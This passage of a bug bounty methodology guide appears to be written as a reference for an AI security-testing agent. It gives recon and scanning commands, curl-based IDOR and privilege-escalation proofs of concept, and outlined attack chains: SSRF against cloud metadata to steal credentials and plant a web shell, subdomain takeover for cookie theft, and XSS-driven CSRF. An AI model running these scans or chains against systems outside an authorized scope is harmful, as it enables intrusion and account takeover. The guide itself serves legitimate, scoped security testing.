cat subdomains.txt | sort -u | httpx -silent -o live-hosts.txt
```

**Port Scanning & Service Detection:**
```bash
# Fast TCP port scan
nmap -iL live-hosts.txt -T4 -p- -oN port-scan.txt

# Service version detection on found ports
nmap -iL live-hosts.txt -sV -sC -p 80,443,8080,8443 -oN service-scan.txt
```

**Content Discovery:**
```bash
# Directory fuzzing
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -mc 200,301,302,403 -o directories.json

# Parameter discovery
arjun -u https://target.com/api/user -m GET -o params.json

# JavaScript file extraction
cat live-hosts.txt | gau | grep ".js$" | httpx -silent -mc 200 > js-files.txt
```

**Technology Detection:**
```bash
# Identify web technologies
whatweb -i live-hosts.txt -v

# Check for known vulnerabilities in tech stack
retire --jspath js-files.txt
```

---

### Vulnerability Chain Building

**Chain 1: Information Disclosure → Account Takeover**
```
1. Discover exposed .git directory (via ffuf)
2. Download .git folder (git-dumper)
3. Extract hardcoded API keys from commit history
4. Use API key to enumerate users (via API)
5. Find admin user ID via IDOR
6. Exploit mass assignment to promote to admin
7. Full account takeover
```

**Chain 2: SSRF → Cloud Metadata → RCE**
```
1. Find SSRF vulnerability (PDF generator, webhook, etc.)
2. Exploit SSRF to access http://169.254.169.254/
3. Extract AWS IAM credentials from metadata service
4. Use credentials to access S3 buckets
5. Upload web shell to public S3 bucket
6. Access web shell for RCE
```

**Chain 3: Subdomain Takeover → Cookie Theft → Session Hijacking**
```
1. Discover dangling CNAME (subdomain points to unclaimed service)
2. Claim subdomain on service (e.g., unused Heroku app)
3. Host malicious page on claimed subdomain
4. Exploit cookie scope (*.target.com) to steal session cookies
5. Use stolen cookies for session hijacking
6. Access victim accounts
```

**Chain 4: XSS → CSRF → Privilege Escalation**
```
1. Find stored XSS in user profile field
2. Inject CSRF payload via XSS
3. CSRF forces admin to change attacker's role to admin
4. Privilege escalation complete
5. Access admin panel
```

**Chaining Best Practices:**
- Document each step with screenshots
- Calculate cumulative CVSS score (chain impact > individual findings)
- Demonstrate real business impact
- Show how defenses were bypassed

---

### Report Writing Best Practices

**Report Structure:**

```markdown
# [Severity] Vulnerability Title

## Summary
Brief (2-3 sentences) description of vulnerability and impact.

## Vulnerability Details
**Type:** SQL Injection / IDOR / XSS / etc.
**Endpoint:** https://target.com/api/vulnerable-endpoint
**Parameter:** user_id
**Impact:** Account takeover, data breach, RCE, etc.

## Steps to Reproduce
1. Navigate to https://target.com/login
2. Proxy traffic through Reaper to capture login request
3. Query Reaper database to get request details:
   ```bash
   docker exec reaper sqlite3 /data/reaper.db "SELECT * FROM requests WHERE path = '/login'"
   ```
4. Modify user_id parameter from 1234 to 1 using curl:
   ```bash
   curl -X POST https://target.com/login -d 'user_id=1&password=test'
   ```
5. Observe access to admin account

## Proof of Concept
```bash
# Include working exploit code
curl -X POST https://target.com/api/user \
  -H "Authorization: Bearer user_token" \
  -d '{"user_id":1,"role":"admin"}'
```

## Impact
- Unauthorized access to any user account
- Potential for data theft (PII, financial data)
- Violation of privacy regulations (GDPR, CCPA)
- Business impact: [$$$$ estimated loss]

## Remediation
1. Implement server-side authorization checks
2. Validate user_id against authenticated session
3. Use UUIDs instead of sequential IDs
4. Add audit logging for privilege changes

## References
- OWASP Top 10: A01:2021 - Broken Access Control
- CWE-639: Authorization Bypass Through User-Controlled Key
```

**Writing Tips:**
- **Be Clear:** Technical but understandable by non-security staff
- **Be Concise:** Respect triager's time (aim for <500 words)
- **Be Complete:** Include all info needed to reproduce
- **Be Professional:** No "leet speak" or excessive jargon
- **Show Impact:** Business impact > technical details

---

### Platform-Specific Tips

**HackerOne:**
- **Response Time:** Usually 1-2 days for initial triage
- **Communication:** Use @mentions for program managers
- **Duplicates:** Search disclosed reports first
- **Bounty Range:** Check program policy for payout estimates
- **Reputation:** Build signal score with quality reports

**Bugcrowd:**
- **VRT:** Use Bugcrowd Vulnerability Rating Taxonomy
- **Priority:** P1 (Critical) to P5 (Informational)
- **Collaboration:** Researchers can collaborate on submissions
- **Kudos:** Earn kudos for helpful community contributions

**Intigriti:**
- **European Focus:** Many EU-based programs
- **Triage:** Intigriti triages before forwarding to program
- **Quality:** High bar for acceptance (lower noise)
- **Community:** Active researcher community and tips

**YesWeHack:**
- **Language:** Supports French and English
- **VDP:** Many Vulnerability Disclosure Programs (no bounty)
- **Response:** Generally slower triage than US platforms

**General Tips:**
- **Read Program Scope:** Always check in-scope/out-of-scope assets
- **Check Safe Harbor:** Understand legal protections
- **Start Small:** Test on VDPs before paid programs
- **Be Patient:** Triage can take days to weeks
- **Handle Duplicates Gracefully:** Learn and move on

---

### Severity Assessment (CVSS Scoring)

**CVSS v3.1 Quick Reference:**

**Critical (9.0-10.0):**
- Unauthenticated RCE
- SQL Injection with data exfiltration
- Authentication bypass on critical systems

**High (7.0-8.9):**
- Authenticated RCE
- Privilege escalation to admin
- Sensitive data exposure (PII, financial)
- Account takeover

**Medium (4.0-6.9):**
- Stored XSS
- IDOR with limited impact
- CSRF on state-changing operations
- Information disclosure (non-sensitive)

**Low (0.1-3.9):**
- Reflected XSS (requires user interaction)
- CSRF on non-critical operations
- Missing security headers
- Rate limiting bypass

**CVSS Calculator:** https://www.first.org/cvss/calculator/3.1

**Severity Modifiers:**
- **Attack Complexity:** Low = easy to exploit, High = difficult
- **Privileges Required:** None = unauthenticated, Low/High = authenticated
- **User Interaction:** None = no victim action needed, Required = phishing/social engineering
- **Scope:** Changed = affects other components, Unchanged = single component
- **Confidentiality/Integrity/Availability:** None/Low/High impact

**Pro Tip:** Programs often have their own severity ratings. Always check program policy and defer to their assessment for bounty estimation.

---

### Proof-of-Concept Guidelines

**Good PoC Characteristics:**
- **Minimal:** Demonstrate vulnerability without causing harm
- **Reproducible:** Works consistently for triagers
- **Safe:** No destructive actions (delete, modify prod data)
- **Clear:** Commented code explaining each step

**Example: IDOR PoC**
```bash
#!/bin/bash
# PoC for IDOR vulnerability in /api/user endpoint
# Demonstrates unauthorized access to other user's profile

# Step 1: Authenticate as low-privilege user
USER_TOKEN=$(curl -s -X POST https://target.com/api/login \
  -d '{"email":"lowpriv@test.com","password":"test123"}' \
  | jq -r '.token')

echo "[*] Authenticated as lowpriv@test.com"
echo "[*] Token: $USER_TOKEN"

# Step 2: Attempt to access admin user (user_id=1)
echo "[*] Attempting to access admin profile (user_id=1)..."

curl -s -X GET https://target.com/api/user/1 \
  -H "Authorization: Bearer $USER_TOKEN" \
  | jq '.'

# Expected (vulnerable): Returns admin user profile
# Expected (secure): 403 Forbidden or 401 Unauthorized

echo "[!] If admin profile data is returned above, IDOR is confirmed"
```

**What NOT to Include:**
- ❌ Automated exploitation tools (avoid sqlmap in PoC if possible)
- ❌ Mass data extraction (show 1-2 records, not entire DB)
- ❌ DoS PoCs that actually crash the service
- ❌ XSS PoCs that steal real credentials (use alert(document.domain))

---

### Bug Bounty Automation Stack

**Reconnaissance:**
```bash
# Daily subdomain monitoring
subfinder -d target.com -o new-subdomains.txt
diff old-subdomains.txt new-subdomains.txt | grep "^>" | notify -silent
```

**Continuous Scanning:**
```bash
# Automated vulnerability scanning on new assets
nuclei -l new-subdomains.txt -t ~/nuclei-templates/ -severity critical,high -o nuclei-findings.txt
```

**Notification Setup:**
```bash
# Install notify tool for alerts
go install -v github.com/projectdiscovery/notify/cmd/notify@latest

# Configure Slack/Discord webhooks in ~/.config/notify/provider-config.yaml
# Receive instant alerts when new assets/vulnerabilities found
```

**Workflow Automation (Bash Script Example):**
```bash
#!/bin/bash
# Daily bug bounty recon automation

TARGET="target.com"
DATE=$(date +%Y-%m-%d)

echo "[*] Starting recon for $TARGET on $DATE"

# Subdomain enumeration
subfinder -d $TARGET -silent | tee subdomains-$DATE.txt

# Find live hosts
cat subdomains-$DATE.txt | httpx -silent -o live-$DATE.txt

# Nuclei scanning
nuclei -l live-$DATE.txt -severity critical,high -o nuclei-$DATE.txt

# Check for new findings
if [ -s nuclei-$DATE.txt ]; then
  echo "[!] New findings detected!" | notify -silent
  cat nuclei-$DATE.txt | notify -silent
fi

echo "[*] Recon complete. Results saved to nuclei-$DATE.txt"
```

---

## Testing Tools

**Web Application Scanners:**
- Nuclei (template-based vulnerability scanning - comprehensive coverage)
- Nikto (web server misconfiguration scanner)
- WPScan (WordPress-specific security scanner)

**Injection Testing:**
- SQLMap (SQL injection detection and exploitation)

**API Testing & Traffic Analysis:**
- Reaper (web/API proxy with SQLite database for endpoint discovery)
- curl (command-line HTTP/API client)
- ffuf (fast web fuzzing for directories and parameters)
- Arjun (API parameter discovery)
- jwt_tool (JWT security testing and manipulation)

**Directory/File Discovery:**
- ffuf (fast web fuzzer - recommended)
- Feroxbuster (recursive directory scanner)

**Subdomain Enumeration:**
- Subfinder (passive subdomain discovery)
- httpx (HTTP probing and filtering)

---

## Reference Resources

### Local Resources (Dynamic Discovery)

**OWASP LLM Top 10:** `standards/frameworks/owasp-llm/` — controls.yaml, questions.yaml
**Crosswalk:** `standards/mappings/crosswalks/owasp-llm.yaml`

**OWASP ASVS:** `standards/frameworks/owasp-asvs/v4/` and `standards/frameworks/owasp-asvs/v5/`
- Use WebFetch for latest OWASP Top 10, API Security, WSTG

**Books:** See `private/docs/book-catalog.md`
- Web/API testing: `private/books/security/bug-bounty-bootcamp-2021/` or `private/books/security/hacking-apis-2022/`

### Web Resources

**OWASP:**
- Top 10: https://owasp.org/Top10/
- API Security Top 10: https://owasp.org/API-Security/
- ASVS: https://owasp.org/www-project-application-security-verification-standard/
- WSTG: https://owasp.org/www-project-web-security-testing-guide/

---

**Created:** 2025-12-01
**Framework:** Intelligence Adjacent (IA) - Security Testing
**Version:** 1.0
